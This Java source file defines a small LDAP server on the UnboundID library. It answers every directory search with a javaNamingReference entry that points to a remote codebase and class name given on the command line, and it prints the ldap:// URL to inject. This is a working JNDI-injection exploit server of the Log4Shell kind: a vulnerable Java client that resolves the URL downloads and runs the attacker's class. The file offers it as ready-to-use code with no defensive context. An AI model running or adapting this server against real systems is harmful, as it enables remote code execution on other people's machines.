package org.neuronaddict.ldapserver;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.UnknownHostException;

public class SimpleLDAPServer {

    private static final String LDAP_BASE = "dc=neuronaddict,dc=org";

    public static void main(String[] args) throws LDAPException, UnknownHostException {
        int port = 1389;
        String javaCodeBase = args[0];
        String className = args[1];

        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
        config.setListenerConfigs(new InMemoryListenerConfig(
                "listen",
                InetAddress.getByName("0.0.0.0"),
                port,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));

        config.addInMemoryOperationInterceptor(new OperationInterceptor(javaCodeBase, className));

        @SuppressWarnings("resource") InMemoryDirectoryServer server = new InMemoryDirectoryServer(config);
        server.startListening();

        System.out.println("LDAP Server listening on 0.0.0.0:" + port);
        System.out.println("Java codebase URL: " + javaCodeBase);
        System.out.println("Class to load: " + className);
        System.out.println("LDAP reference URL: ldap://localhost:" + port + "/" + className + ",dc=example,dc=com");

    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        private final String codebase;
        private final String className;

        public OperationInterceptor(String codebase, String className) {
            this.codebase = codebase;
            this.className = className;
        }

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String baseDN = result.getRequest().getBaseDN();
            Entry entry = new Entry(baseDN);

            entry.addAttribute("javaClassName", className);
            entry.addAttribute("javaFactory", className);
            entry.addAttribute("objectClass", "javaNamingReference");
            entry.addAttribute("javaCodeBase", codebase);

            try {
                result.sendSearchEntry(entry);
            } catch (LDAPException e) {
                throw new RuntimeException(e);
            }
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));

        }
    }
}